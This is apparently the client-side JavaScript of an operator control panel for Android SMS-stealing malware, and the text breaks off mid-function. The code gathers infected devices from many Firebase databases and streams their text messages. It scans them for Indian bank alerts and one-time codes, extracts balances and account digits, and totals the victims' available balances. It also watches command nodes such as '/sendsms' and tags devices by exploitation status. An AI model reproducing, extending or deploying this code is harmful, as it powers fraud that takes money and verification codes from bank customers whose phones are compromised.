/* ========================================
   Firebase Dynamic Admin Panel - App Logic
   v3.0 — Bank Intelligence + Silent Refresh + Premium UI
   ======================================== */

// ── State ──
const state = {
  firebaseApp: null,
  db: null,
  currentConfig: null,
  connections: [],
  clients: {},
  messages: {},       // per-device SMS cache: { deviceId: { msgId: {...} } }
  commands: {},
  admin: {},
  botUsers: {},
  allData: {},
  listeners: [],
  currentPage: 'devices',
  currentSmsDevice: null,
  smsTab: 'all',      // all | bank | otp | sent
  smsSearch: '',
  searchQuery: '',
  deviceFilter: 'all',
  smsDeviceFilter: 'all',
  viewMode: 'grid',
  schema: {},
  schemaType: 'A',    // 'A' = legacy clients/messages | 'B' = user_data/user_sms
  schemaB: {},        // extra Schema B data: login, Card, account per deviceId
  loadedSmsDevices: new Set(),  // track which devices have SMS loaded
  loadedPages: new Set(),       // track which pages have been loaded
  deviceBankData: {},  // per-device bank info: { deviceId: { latestBalance, lastTxn, bankName, account, bankSmsCount } }
  _lastRenderedMsgIds: {},  // for silent refresh: { deviceId: Set(msgIds) }
  // Unified mode state
  isUnified: false,         // true when in /unified mode
  unifiedPanels: [],        // [{panelId, db, app, config, label, schemaType, clientsPath, commandsPath, smsPathFn}]
  devicePanelMap: {},       // deviceId → index into unifiedPanels
};

// ── Bank SMS Patterns ──
// CONTENT-FIRST detection: a message is bank SMS if it contains banking keywords + amounts
// Sender codes are only used to resolve human-readable bank names, NOT for detection

const OTP_PATTERN = /\b(?:OTP|otp|code|verification|pin|verify|one.?time)\b/i;
const OTP_CODE_REGEX = /\b(\d{4,8})\b/g;

// Strip carrier prefix (e.g. JK-, VM-, BP-, AD-) and suffix (e.g. -S, -T) from sender
function cleanSenderCode(sender) {
  if (!sender) return '';
  return sender.replace(/^[A-Z]{2}-/i, '').replace(/-[A-Z]$/i, '');
}

// Map sender codes → human-readable bank names (for display only)
const BANK_NAMES = {
  'SBIINB': 'SBI', 'SBIUPI': 'SBI UPI', 'SBI': 'SBI', 'HDFCBK': 'HDFC Bank', 'ICICIB': 'ICICI Bank',
  'AXISBK': 'Axis Bank', 'PAYTMB': 'Paytm Bank', 'KOTAKB': 'Kotak Bank', 'BOIIND': 'Bank of India',
  'PNBSMS': 'PNB', 'CANBNK': 'Canara Bank', 'UNIONB': 'Union Bank', 'IDBIBK': 'IDBI Bank',
  'YESBK': 'Yes Bank', 'INDBNK': 'Indian Bank', 'BOBSMS': 'BOB', 'CENTBK': 'Central Bank',
  'IDFCFB': 'IDFC First', 'FEDBNK': 'Federal Bank', 'RBLBNK': 'RBL Bank',
  'WBGBNK': 'WBGB', 'UPGBX': 'UPGB', 'SBIPSG': 'SBI', 'SBISMS': 'SBI',
  'AUSFIN': 'AU Finance', 'JKBANK': 'J&K Bank', 'BARODA': 'Bank of Baroda',
  'SCBANK': 'Standard Chartered', 'CITIBK': 'Citibank', 'MAHABK': 'Bank of Maharashtra',
  'INDUSB': 'IndusInd Bank', 'TMBANK': 'Tamilnad Mercantile',
};
const AMOUNT_REGEX = /(?:Rs\.?|INR|₹)\s*([\d,]+(?:\.\d{1,2})?)/gi;
const CREDIT_KEYWORDS = /credited|received|deposited|added|refund|cashback|credit/i;
const DEBIT_KEYWORDS = /debited|withdrawn|paid|spent|deducted|debit|purchase|transfer(?:red)?\s+(?:to|from)/i;
const BALANCE_REGEX = /(?:(?:avl?\.?\s*|aval?\s*|avbl?\s*|clear\s*)?bal(?:ance)?|available\s*balance|a\/c\s*bal)(?:\s*(?:is|:|\.)?\s*)(?:Rs\.?|INR|₹)\s*([\d,]+(?:\.\d{1,2})?)\s*(?:CR)?/i;
const ACCOUNT_REGEX = /(?:a\/c|acct?|account)\s*(?:no\.?\s*)?(?:[xX*]+\s*)([\d]{3,6})/i;

// CONTENT-FIRST bank SMS detection
const BANK_CONTENT_REGEX = /(?:debited|credited|debit|credit|Aval?\s*Bal|Avl\.?\s*Bal|available\s*balance|a\/c\s*(?:no\.?\s*)?[xX*]+\d|transaction|UPI\s*(?:Ref|trf)|NEFT|IMPS|RTGS)/i;

// ── Firebase Connection Manager (panels-based — shareable links) ──

// ── Auth helper: inject session token into all admin API requests ──
function authFetch(url, options = {}) {
  const token = sessionStorage.getItem('auth_token');
  if (token) {
    if (!options.headers) options.headers = {};
    if (typeof options.headers === 'object' && !(options.headers instanceof Headers)) {
      options.headers['Authorization'] = `Bearer ${token}`;
    }
  }
  return fetch(url, options);
}

// Current panel ID (set after creating/loading a panel)
let currentPanelId = null;

// ── Auto-generate cool panel names ──
const _nameAdj = ['Shadow','Neon','Cosmic','Phantom','Blaze','Thunder','Frost','Venom','Stealth','Cyber','Iron','Dark','Ghost','Storm','Toxic','Nova','Turbo','Rapid','Ultra','Hyper','Mystic','Razor','Atomic','Quantum','Silent','Rogue','Omega','Alpha','Prism','Apex'];

// Extract project name from Firebase URL: https://mayor-6f08c-default-rtdb.firebaseio.com → "mayor-6f08c"
function extractNameFromUrl(url) {
  if (!url) return '';
  try {
    let host = url.replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
    let name = host.split('.')[0] || '';
    // Remove -default-rtdb suffix
    name = name.replace(/-default-rtdb$/i, '');
    return name.toLowerCase();
  } catch (e) { return ''; }
}

// Client preview: "Cosmic-mayor-6f08c-384" (server replaces number with real ascending panelNo)
function generatePanelName(firebaseUrl) {
  const adj = _nameAdj[Math.floor(Math.random() * _nameAdj.length)];
  const num = Math.floor(Math.random() * 900) + 100;
  const extracted = extractNameFromUrl(firebaseUrl);
  if (extracted && extracted.length > 1) {
    return `${adj}-${extracted}-${num}`;
  }
  return `${adj}-panel-${num}`;
}

function loadSavedConnections() {
  // Just sync existing configs to server — no UI needed on login
  // Also load last config for auto-connect
}

function saveConnections() {
  // Legacy — configs still synced to server on connect
}

function addConnection(config, showModal = true) {
  localStorage.setItem('fb_panel_last_config', JSON.stringify(config));
  // Create a panel on the server and get a shareable link
  createPanel(config, showModal);
}

async function createPanel(config, showModal = true) {
  try {
    const autoLabel = config.label || generatePanelName();
    const resp = await fetch('/api/panel', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        databaseURL: config.databaseURL,
        label: autoLabel
      })
    });
    if (!resp.ok) {
      // Auth failed (new panel creation requires admin) — use existing panelId if we have one
      console.warn(`[Panel] POST /api/panel returned ${resp.status} — using existing panelId: ${currentPanelId || 'none'}`);
      // Still show share button if we already have a panelId (from URL auto-connect)
      if (currentPanelId) {
        const shareBtn = document.getElementById('sharePanelBtn');
        if (shareBtn) shareBtn.style.display = 'flex';
      }
      return;
    }
    const data = await resp.json();
    if (data.panelId) {
      currentPanelId = data.panelId;
      // Only show share modal on manual connect (not auto-connect or iframe)
      const isInIframe = window.self !== window.top;
      if (showModal && !isInIframe) {
        showShareLink(data.shareUrl, data.panelId);
      }
      // Show share button in sidebar
      const shareBtn = document.getElementById('sharePanelBtn');
      if (shareBtn) shareBtn.style.display = 'flex';
      console.log(`[Panel] Created/updated: ${data.panelId} → ${data.shareUrl}`);
    }
  } catch (err) {
    console.warn('[Panel] Failed to create panel:', err.message);
    // Ensure share button is visible if we already know the panelId
    if (currentPanelId) {
      const shareBtn = document.getElementById('sharePanelBtn');
      if (shareBtn) shareBtn.style.display = 'flex';
    }
  }
}

function showShareLink(url, panelId) {
  const input = document.getElementById('shareLinkInput');
  const code = document.getElementById('sharePanelIdCode');
  if (input) input.value = url;
  if (code) code.textContent = panelId;
  openModal('shareLinkModal');
}

function copyShareLink() {
  const input = document.getElementById('shareLinkInput');
  if (!input) return;
  safeCopy(input.value);
  const btn = document.getElementById('shareCopyBtn');
  if (btn) {
    btn.classList.add('copied');
    btn.innerHTML = '✓ Copied!';
    setTimeout(() => {
      btn.classList.remove('copied');
      btn.innerHTML = `<svg viewBox="0 0 16 16" fill="currentColor" width="14" height="14"><rect x="4" y="4" width="10" height="10" rx="1.5" stroke="currentColor" fill="none" stroke-width="1.5"/><path d="M12 4V2.5A1.5 1.5 0 0010.5 1H2.5A1.5 1.5 0 001 2.5v8A1.5 1.5 0 002.5 12H4" stroke="currentColor" fill="none" stroke-width="1.5"/></svg> Copy`;
    }, 2000);
  }
  showToast('Link copied!', 'success');
}

// ── Auto-connect on page load (supports /panel/:panelId URLs) ──
async function tryAutoConnect() {
  // Check if this is a temporary route (unified mode)
  const pathToken = window.location.pathname.match(/^\/(t_[a-f0-9]+)$/i);
  if (pathToken) {
    try {
      const checkResp = await fetch(`/api/route-check/${pathToken[1]}`);
      const checkData = await checkResp.json();
      if (checkData.valid && checkData.type === 'unified') {
        await connectUnified();
        return;
      }
    } catch (e) {
      console.warn('[TempRoute] Route check failed:', e);
    }
  }

  // Check if URL is /panel/:panelId
  const pathMatch = window.location.pathname.match(/^\/panel\/([a-f0-9]+)$/i);
  if (pathMatch) {
    const panelId = pathMatch[1];
    try {
      showToast('Loading panel…', 'info');
      const resp = await fetch(`/api/panel/${panelId}`);
      if (!resp.ok) {
        showToast('Panel not found', 'error');
        return;
      }
      const panel = await resp.json();
      currentPanelId = panelId;
      state._showModalOnConnect = false; // suppress share modal for URL auto-connect
      await connectFirebase({
        databaseURL: panel.databaseURL,
        apiKey: panel.apiKey,
        label: panel.label
      });
      state._showModalOnConnect = undefined;
      // Show share button
      const shareBtn = document.getElementById('sharePanelBtn');
      if (shareBtn) shareBtn.style.display = 'flex';
      return;
    } catch (e) {
      console.warn('Panel auto-connect failed:', e);
      showToast('Failed to load panel', 'error');
      return;
    }
  }

  // Fallback: try last saved config
  try {
    const lastConfig = localStorage.getItem('fb_panel_last_config');
    if (lastConfig) {
      const config = JSON.parse(lastConfig);
      if (config.databaseURL) {
        showToast('Auto-connecting to last database...', 'info');
        state._showModalOnConnect = false; // suppress share modal for auto-connect
        await connectFirebase(config);
        state._showModalOnConnect = undefined;
      }
    }
  } catch (e) {
    console.warn('Auto-connect failed:', e);
  }
}

// ═══════════════════════════════════════════
// Multi-panel connector
// ═══════════════════════════════════════════

async function connectUnified() {
  try {
    // Auth gate — server-side validation (key never stored in client JS)
    if (!sessionStorage.getItem('auth_token')) {
      const key = prompt('🔐 Enter admin access key to view unified panel:');
      if (!key) { window.location.href = '/rimjhim'; return; }

      const authResp = await fetch('/api/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ key })
      });
      if (!authResp.ok) {
        alert('Invalid access key');
        window.location.href = '/rimjhim';
        return;
      }
      const authData = await authResp.json();
      sessionStorage.setItem('auth_token', authData.token);
    }

    showToast('Loading all panels…', 'info');

    const resp = await authFetch('/api/panels');
    const data = await resp.json();
    const panelList = data.panels || [];

    if (panelList.length === 0) {
      showToast('No panels found', 'error');
      return;
    }

    state.isUnified = true;
    state.unifiedPanels = [];
    state.devicePanelMap = {};

    // Hide login, show app
    document.getElementById('loginScreen').classList.add('hidden');
    document.getElementById('appLayout').classList.add('active');
    _setConnectionLabel(`Unified (${panelList.length} panels)`, true);

    // Hide share button in unified mode
    const shareBtn = document.getElementById('sharePanelBtn');
    if (shareBtn) shareBtn.style.display = 'none';

    // ── Helper: fetch with timeout (5s) ──
    function fetchWithTimeout(url, ms = 5000) {
      return Promise.race([
        fetch(url),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), ms))
      ]);
    }

    // ── Initialize panel (detect schema) — returns panel entry or null ──
    async function initPanel(panel, index) {
      const appName = `unified_${panel.panelId}`;
      try {
        const firebaseConfig = { apiKey: panel.apiKey || 'dummy-key', databaseURL: panel.databaseURL };
        const app = firebase.initializeApp(firebaseConfig, appName);
        const db = firebase.database(app);

        let schemaType = 'A';
        try {
          const schemaResp = await fetchWithTimeout(`${panel.databaseURL}/.json?shallow=true`);
          if (schemaResp.ok) {
            const keys = Object.keys(await schemaResp.json());
            const hc = keys.includes('clients');
            const hud = keys.includes('user_data') || keys.includes('user_sms');
            const hsd = keys.includes('users') && keys.includes('mess');

            if (hsd && !hc && !hud) {
              schemaType = 'D';
            } else if (hud && hc) {
              try {
                const [cr, ur] = await Promise.all([
                  fetchWithTimeout(`${panel.databaseURL}/clients.json?shallow=true`),
                  fetchWithTimeout(`${panel.databaseURL}/user_data.json?shallow=true`)
                ]);
                const cc = cr.ok ? Object.keys((await cr.json()) || {}).length : 0;
                const uc = ur.ok ? Object.keys((await ur.json()) || {}).length : 0;
                schemaType = cc >= uc ? 'A' : 'B';
              } catch { schemaType = 'A'; }
            } else if (hud) {
              schemaType = 'B';
            } else if (hsd) {
              schemaType = 'D';
            }
          }
        } catch (e) { /* timeout or error — default A */ }

        const clientsPath = schemaType === 'B' ? '/user_data' : schemaType === 'D' ? '/users' : '/clients';
        const commandsPath = schemaType === 'D' ? '/sendsms' : '/commands';
        const smsPathFn = (deviceId) => {
          return schemaType === 'B' ? `/user_sms/${deviceId}`
               : schemaType === 'D' ? `/mess/${deviceId}/smss`
               : `/messages/${deviceId}`;
        };

        console.log(`[Unified] Panel ${index+1}/${panelList.length}: ${panel.label} (Schema ${schemaType})`);
        return {
          panelId: panel.panelId, db, app,
          config: { databaseURL: panel.databaseURL, apiKey: panel.apiKey, label: panel.label },
          label: panel.label, schemaType, clientsPath, commandsPath, smsPathFn, _index: index
        };
      } catch (e) {
        console.error(`[Unified] Failed to init panel ${panel.label}:`, e);
        return null;
      }
    }

    // ── Initialize all panels in parallel batches of 15 ──
    const BATCH_SIZE = 15;
    for (let b = 0; b < panelList.length; b += BATCH_SIZE) {
      const batch = panelList.slice(b, b + BATCH_SIZE);
      const results = await Promise.allSettled(
        batch.map((panel, j) => initPanel(panel, b + j))
      );
      for (const r of results) {
        if (r.status === 'fulfilled' && r.value) {
          state.unifiedPanels.push(r.value);
        }
      }
      showToast(`Loading panels… ${Math.min(b + BATCH_SIZE, panelList.length)}/${panelList.length}`, 'info');
    }

    // Set state.db to the first panel's db as a fallback
    if (state.unifiedPanels.length > 0) {
      state.db = state.unifiedPanels[0].db;
      state.currentConfig = state.unifiedPanels[0].config;
      state.schemaType = state.unifiedPanels[0].schemaType;
    }

    // Reset state
    state.loadedSmsDevices = new Set();
    state.loadedPages = new Set(['devices']);
    state.messages = {};
    state.clients = {};
    state.commands = {};
    state.schemaB = {};

    // ── Load devices from ALL panels in parallel batches ──
    async function loadDevicesFromPanel(p, pIdx) {
      try {
        const devResp = await fetchWithTimeout(`${p.config.databaseURL}${p.clientsPath}.json`);
        if (devResp.ok) {
          const raw = await devResp.json();
          if (raw && typeof raw === 'object') {
            const origSchema = state.schemaType;
            state.schemaType = p.schemaType;
            Object.entries(raw).forEach(([id, device]) => {
              _processDevice(id, device);
              if (state.clients[id]) {
                state.clients[id]._panelLabel = p.label;
                state.clients[id]._panelId = p.panelId;
                state.clients[id]._panelIndex = pIdx;
              }
              state.devicePanelMap[id] = pIdx;
            });
            state.schemaType = origSchema;
          }
        }
      } catch (e) { /* timeout — skip */ }
    }

    for (let b = 0; b < state.unifiedPanels.length; b += BATCH_SIZE) {
      const batch = state.unifiedPanels.slice(b, b + BATCH_SIZE);
      await Promise.allSettled(batch.map((p, j) => loadDevicesFromPanel(p, b + j)));
    }

    // Immediate UI render
    updateDashboard();
    updateDeviceView();
    updateNavBadges();

    // Set up live SDK listeners for ALL panels
    for (let i = 0; i < state.unifiedPanels.length; i++) {
      const p = state.unifiedPanels[i];
      const clientsRef = p.db.ref(p.clientsPath);

      const onAdd = clientsRef.on('child_added', (snap) => {
        const origSchema = state.schemaType;
        state.schemaType = p.schemaType;
        _processDevice(snap.key, snap.val());
        state.schemaType = origSchema;
        
        if (state.clients[snap.key]) {
          state.clients[snap.key]._panelLabel = p.label;
          state.clients[snap.key]._panelId = p.panelId;
          state.clients[snap.key]._panelIndex = i;
        }
        state.devicePanelMap[snap.key] = i;
        scheduleUIUpdate();
      });

      const onChange = clientsRef.on('child_changed', (snap) => {
        const origSchema = state.schemaType;
        state.schemaType = p.schemaType;
        _processDevice(snap.key, snap.val());
        state.schemaType = origSchema;
        
        if (state.clients[snap.key]) {
          state.clients[snap.key]._panelLabel = p.label;
          state.clients[snap.key]._panelId = p.panelId;
          state.clients[snap.key]._panelIndex = i;
        }
        scheduleUIUpdate();
      });

      const onRemove = clientsRef.on('child_removed', (snap) => {
        delete state.clients[snap.key];
        delete state.devicePanelMap[snap.key];
        scheduleUIUpdate();
      });

      state.listeners.push(
        () => clientsRef.off('child_added', onAdd),
        () => clientsRef.off('child_changed', onChange),
        () => clientsRef.off('child_removed', onRemove)
      );

      // Commands listeners per panel
      if (p.schemaType !== 'B') {
        const cmdRef = p.db.ref(p.commandsPath);
        const cmdAdd = cmdRef.on('child_added', (snap) => {
          state.commands[snap.key] = snap.val();
          scheduleCmdUpdate();
        });
        const cmdChange = cmdRef.on('child_changed', (snap) => {
          state.commands[snap.key] = snap.val();
          scheduleCmdUpdate();
        });
        const cmdRemove = cmdRef.on('child_removed', (snap) => {
          delete state.commands[snap.key];
          scheduleCmdUpdate();
        });
        state.listeners.push(
          () => cmdRef.off('child_added', cmdAdd),
          () => cmdRef.off('child_changed', cmdChange),
          () => cmdRef.off('child_removed', cmdRemove)
        );
      }
    }

    showToast(`Unified mode: ${state.unifiedPanels.length} panels, ${Object.keys(state.clients).length} devices`, 'success');
    navigateTo('devices');

    // Auto-scan after delay
    setTimeout(() => {
      if (Object.keys(state.clients).length > 0) {
        startBackgroundBankScan();
      }
    }, 5000);

  } catch (err) {
    console.error('[Unified] Connection failed:', err);
    showToast('Unified connection failed: ' + err.message, 'error');
  }
}

// ── Helper: Get the correct db and config for a specific device ──
// In unified mode, routes to the panel that owns this device
// In normal mode, returns the single global db
function getDbForDevice(deviceId) {
  if (state.isUnified && deviceId) {
    const panelIdx = state.devicePanelMap[deviceId];
    if (panelIdx !== undefined && state.unifiedPanels[panelIdx]) {
      const p = state.unifiedPanels[panelIdx];
      return { db: p.db, config: p.config, schemaType: p.schemaType, smsPathFn: p.smsPathFn };
    }
  }
  // Fallback: single db mode
  return {
    db: state.db,
    config: state.currentConfig,
    schemaType: state.schemaType,
    smsPathFn: (did) => {
      return state.schemaType === 'B' ? `/user_sms/${did}`
           : state.schemaType === 'D' ? `/mess/${did}/smss`
           : `/messages/${did}`;
    }
  };
}

// Get schema type for a specific device (may differ per panel in unified mode)
function getSchemaForDevice(deviceId) {
  if (state.isUnified && deviceId) {
    const panelIdx = state.devicePanelMap[deviceId];
    if (panelIdx !== undefined && state.unifiedPanels[panelIdx]) {
      return state.unifiedPanels[panelIdx].schemaType;
    }
  }
  return state.schemaType;
}

async function connectFirebase(config) {
  try {
    showToast('Connecting to Firebase…', 'info');

    // Clean up previous Firebase instance
    cleanupListeners();
    if (state.firebaseApp) {
      try { await firebase.app().delete(); } catch(e) {}
      state.firebaseApp = null;
    }

    const firebaseConfig = { apiKey: config.apiKey, databaseURL: config.databaseURL };
    if (config.appId)         firebaseConfig.appId         = config.appId;
    if (config.storageBucket) firebaseConfig.storageBucket = config.storageBucket;
    if (config.projectId)     firebaseConfig.projectId     = config.projectId;

    state.firebaseApp = firebase.initializeApp(firebaseConfig);
    state.db = firebase.database();
    state.currentConfig = config;

    addConnection(config, state._showModalOnConnect !== false);

    // Reset lazy loading state
    state.loadedSmsDevices = new Set();
    state.loadedPages = new Set(['devices']);
    state.messages = {};
    state.clients = {};
    state.commands = {};
    state.schemaB = {};
    state.schemaType = 'A'; // reset until detected

    // ── Show app, hide login ──
    document.getElementById('loginScreen').classList.add('hidden');
    document.getElementById('appLayout').classList.add('active');

    // ── Update ALL connection indicators without page reload ──
    const label = config.label || config.projectId || extractDomain(config.databaseURL);
    _setConnectionLabel(label, true);

    // Register with server
    try {
      await authFetch('/api/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ databaseURL: config.databaseURL, apiKey: config.apiKey, label })
      });
    } catch (e) { console.warn('Server config register failed:', e); }

    await startListeners();
    showToast('Connected!', 'success');

    // Force device view render after connection (ensures devices show even if events race)
    navigateTo('devices');
    setTimeout(() => {
      updateDashboard();
      updateDeviceView();
      updateNavBadges();
    }, 500);
  } catch (err) {
    console.error('Connection error:', err);
    showToast('Connection failed: ' + err.message, 'error');
  }
}

function _setConnectionLabel(label, isConnected) {
  // dbName sidebar
  const dbNameEl = document.getElementById('dbName');
  if (dbNameEl) dbNameEl.textContent = label;
  // status text
  const statusEl = document.getElementById('dbStatusText');
  if (statusEl) statusEl.textContent = isConnected ? 'Connected' : 'Disconnected';
  // topbar name
  const tnEl = document.getElementById('topbarConnName');
  if (tnEl) tnEl.textContent = label;
  // mobile name
  const mnEl = document.getElementById('mobileConnName');
  if (mnEl) mnEl.textContent = label;
  // dots
  const dotClass = isConnected ? 'dot-green' : 'dot-gray';
  ['sidebarConnDot','topbarConnDot','mobileConnDot'].forEach(id => {
    const el = document.getElementById(id);
    if (!el) return;
    el.className = el.className.split(' ').filter(c => !c.startsWith('dot-')).join(' ') + ' ' + dotClass;
  });
}

function disconnectFirebase() {
  clearTimeout(_uiUpdateTimer);
  clearTimeout(_cmdUpdateTimer);
  cleanupListeners();
  if (state.firebaseApp) {
    firebase.app().delete().catch(() => {});
    state.firebaseApp = null;
    state.db = null;
  }
  state.clients = {};
  state.messages = {};
  state.commands = {};
  state.admin = {};
  state.botUsers = {};
  state.allData = {};
  state.currentConfig = null;
  state.currentSmsDevice = null;
  state.loadedSmsDevices = new Set();
  state.loadedPages = new Set();

  document.getElementById('appLayout').classList.remove('active');
  document.getElementById('loginScreen').classList.remove('hidden');
  _setConnectionLabel('—', false);
  loadSavedConnections();
}

// ── Listeners (INCREMENTAL — child_* events for performance) ──

function cleanupListeners() {
  state.listeners.forEach(unsub => {
    try { unsub(); } catch { }
  });
  state.listeners = [];
  // Reset auto-scan state
  _autoScanTriggered = false;
  _bankScanAborted = true; // Abort any running scan
  clearTimeout(_autoScanTimer);
  state.deviceBankData = {};
  state._lastRenderedMsgIds = {};
  const scanBar = document.getElementById('bankScanBar');
  if (scanBar) scanBar.style.display = 'none';
}

// Debounced UI update — batches rapid child_added events during initial load
let _uiUpdateTimer = null;
let _cmdUpdateTimer = null;
let _autoScanTriggered = false;
let _autoScanTimer = null;

function scheduleUIUpdate() {
  clearTimeout(_uiUpdateTimer);
  _uiUpdateTimer = setTimeout(() => {
    try { updateDashboard(); } catch(e) { console.error('[UI] Dashboard error:', e); }
    try { updateDeviceView(); } catch(e) { console.error('[UI] DeviceView error:', e); }
    try { if (state.currentPage === 'sms') updateSmsDeviceList(); } catch(e) { console.error('[UI] SmsList error:', e); }
    try { updateNavBadges(); } catch(e) { console.error('[UI] NavBadges error:', e); }

    // Auto-scan: wait 5s after last device arrives, then start background scan
    if (!_autoScanTriggered && Object.keys(state.clients).length > 0) {
      clearTimeout(_autoScanTimer);
      _autoScanTimer = setTimeout(() => {
        if (!_autoScanTriggered) {
          _autoScanTriggered = true;
          startBackgroundBankScan();
        }
      }, 5000); // 5s after last device — plenty of time to finish loading
    }
  }, 150);
}

// ── Background Bank SMS Scan ──
// Non-blocking: loads SMS lazily, checks bank data as it arrives
// Does NOT block device loading or UI rendering
// mode: 'online' = only online devices (auto), 'offline' = only offline, 'all' = everything

let _bankScanAborted = false;

function startBackgroundBankScan(mode = 'online') {
  const allDeviceIds = Object.keys(state.clients);
  if (allDeviceIds.length === 0) return;

  // Filter devices by mode
  const deviceIds = allDeviceIds.filter(id => {
    const c = state.clients[id];
    const isOnline = c.status === true || c.status === 'online';
    if (mode === 'online') return isOnline;
    if (mode === 'offline') return !isOnline;
    return true; // 'all'
  });

  if (deviceIds.length === 0) {
    if (mode === 'offline') showToast('No offline devices to scan', 'info');
    return;
  }

  const scanBar = document.getElementById('bankScanBar');
  const scanTitle = document.getElementById('bankScanTitle');
  const scanProgress = document.getElementById('bankScanProgress');
  const scanDetail = document.getElementById('bankScanDetail');
  const scanStats = document.getElementById('bankScanStats');

  if (!scanBar) return;
  _bankScanAborted = false;

  // Show scan bar
  scanBar.style.display = 'block';
  scanBar.classList.remove('done');
  const modeLabel = mode === 'online' ? 'online' : mode === 'offline' ? 'offline' : 'all';
  scanTitle.textContent = `🔍 Scanning ${modeLabel} devices for bank data...`;

  let scanned = 0;
  const total = deviceIds.length;
  let totalBankSms = 0;
  let totalBalance = null;
  let devicesWithBank = 0;

  // If scanning offline, preserve existing online scan totals
  if (mode === 'offline' || mode === 'all') {
    // Recount from existing bank data
    for (const [did, bd] of Object.entries(state.deviceBankData)) {
      if (bd && bd.bankSmsCount > 0) {
        totalBankSms += bd.bankSmsCount;
        devicesWithBank++;
        if (bd.latestBalance !== null) totalBalance = (totalBalance || 0) + bd.latestBalance;
      }
    }
  }

  function updateScanUI() {
    const pct = Math.round((scanned / total) * 100);
    scanProgress.style.width = pct + '%';
    scanDetail.textContent = `${scanned} / ${total} ${modeLabel} devices · ${totalBankSms} bank SMS found`;

    let statsHtml = '';
    if (totalBalance !== null) {
      statsHtml = `<div class="bank-scan-stat-val">${formatCurrency(totalBalance)}</div>
        <div class="bank-scan-stat-lbl">Total Avl. Balance</div>`;
    }
    if (devicesWithBank > 0) {
      statsHtml += `<div class="bank-scan-stat-val" style="font-size:0.85rem;margin-top:4px">${devicesWithBank}</div>
        <div class="bank-scan-stat-lbl">With Bank Data</div>`;
    }
    scanStats.innerHTML = statsHtml;

    // Update Avl. Balance stat card
    const balStat = document.getElementById('statBankBal');
    if (balStat) {
      if (totalBalance !== null) {
        balStat.textContent = formatCurrency(totalBalance);
        balStat.style.color = 'var(--green)';
      } else {
        balStat.textContent = scanned < total ? '...' : '—';
      }
    }
  }

  // Process ONE device at a time using setTimeout chain (non-blocking)
  function processNextDevice(index) {
    if (_bankScanAborted || index >= deviceIds.length) {
      // Done or aborted
      if (!_bankScanAborted) {
        scanBar.classList.add('done');

        if (mode === 'online') {
          // After online scan, show option to scan offline
          const offlineCount = allDeviceIds.filter(id => {
            const c = state.clients[id];
            return !(c.status === true || c.status === 'online');
          }).length;

          if (offlineCount > 0) {
            scanTitle.innerHTML = `✅ Online scan done — ${devicesWithBank} with bank data &nbsp;
              <button onclick="startBackgroundBankScan('offline')" style="
                background:var(--orange,#f59e0b);color:#000;border:none;padding:4px 12px;
                border-radius:6px;cursor:pointer;font-size:0.75rem;font-weight:600;
              ">🔄 Scan ${offlineCount} Offline Devices</button>`;
          } else {
            scanTitle.textContent = `✅ Scan complete — ${devicesWithBank} devices with bank data`;
          }
        } else {
          scanTitle.textContent = `✅ ${modeLabel} scan complete — ${devicesWithBank} devices with bank data`;
        }

        scanDetail.textContent = `${total} ${modeLabel} devices · ${totalBankSms} bank SMS · ${devicesWithBank} with bank info`;
        updateDeviceView(); // Final update
        setTimeout(() => { scanBar.style.display = 'none'; }, mode === 'online' ? 30000 : 8000);
      }
      return;
    }

    const deviceId = deviceIds[index];

    // Trigger SMS load (non-blocking — Firebase will stream data in)
    loadDeviceSms(deviceId);

    // Wait 800ms then check what data arrived
    setTimeout(() => {
      if (_bankScanAborted) return;

      computeDeviceBankData(deviceId);

      const bankData = state.deviceBankData[deviceId];
      if (bankData && bankData.bankSmsCount > 0) {
        totalBankSms += bankData.bankSmsCount;
        devicesWithBank++;
        if (bankData.latestBalance !== null) {
          totalBalance = (totalBalance || 0) + bankData.latestBalance;
        }
      }

      scanned++;
      updateScanUI();

      // Update device cards after each device so user sees results instantly
      updateDeviceView();

      // Process next device — yield to main thread
      setTimeout(() => processNextDevice(index + 1), 100);
    }, 800);
  }

  // Start processing from device 0
  processNextDevice(0);
}

function scheduleCmdUpdate() {
  clearTimeout(_cmdUpdateTimer);
  _cmdUpdateTimer = setTimeout(() => {
    if (state.currentPage === 'commands') updateCommandsView();
    updateNavBadges();
  }, 150);
}

// Process a single device record for state.clients
function _processDevice(id, raw) {
  if (state.schemaType === 'B' || state.schemaType === 'D') {
    state.clients[id] = normalizeDevice(raw, id);
  } else {
    // Schema A: true Schema A has modelName/sims, Schema C (panel-9) doesn't
    const isSchemaC = !raw.modelName && !raw.sims && !raw.service_provider;
    state.clients[id] = isSchemaC ? normalizeDevice(raw, id) : raw;
  }
}

async function startListeners() {
  const db = state.db;
  if (!db) return;
  const dbUrl = state.currentConfig?.databaseURL;

  // Detect schema type first (uses REST shallow=true, super fast)
  await detectSchemaType();

  const clientsPath = state.schemaType === 'B' ? '/user_data' : state.schemaType === 'D' ? '/users' : '/clients';
  const commandsPath = state.schemaType === 'D' ? '/sendsms' : '/commands';

  if (state.schemaType === 'B') {
    showToast('Detected new DB structure — switching adapter…', 'info');
  } else if (state.schemaType === 'D') {
    showToast('Detected Schema D (users/mess) — switching adapter…', 'info');
  }

  // ═══════════════════════════════════════════════════════════
  // STEP 1: REST FETCH — instant initial load (single HTTP GET)
  // This is 10-50x faster than Firebase SDK for initial data
  // ═══════════════════════════════════════════════════════════
  try {
    const resp = await fetch(`${dbUrl}${clientsPath}.json`);
    if (resp.ok) {
      const raw = await resp.json();
      if (raw && typeof raw === 'object') {
        Object.entries(raw).forEach(([id, device]) => {
          _processDevice(id, device);
        });
        // Immediate UI render — user sees data NOW
        updateDashboard();
        updateDeviceView();
        if (state.currentPage === 'sms') updateSmsDeviceList();
        updateNavBadges();
        console.log(`[REST] Loaded ${Object.keys(raw).length} devices instantly`);
      }
    }
  } catch (e) {
    console.warn('[REST] Initial fetch failed, falling back to SDK:', e);
  }

  // Schema D: also fetch device_status node for status tags (virgin/fucked/etc)
  if (state.schemaType === 'D' && dbUrl) {
    if (!state._deviceStatus) state._deviceStatus = {};
    try {
      const dsResp = await fetch(`${dbUrl}/device_status.json`);
      if (dsResp.ok) {
        const dsData = await dsResp.json();
        if (dsData && typeof dsData === 'object') {
          state._deviceStatus = dsData;
          updateDeviceView();
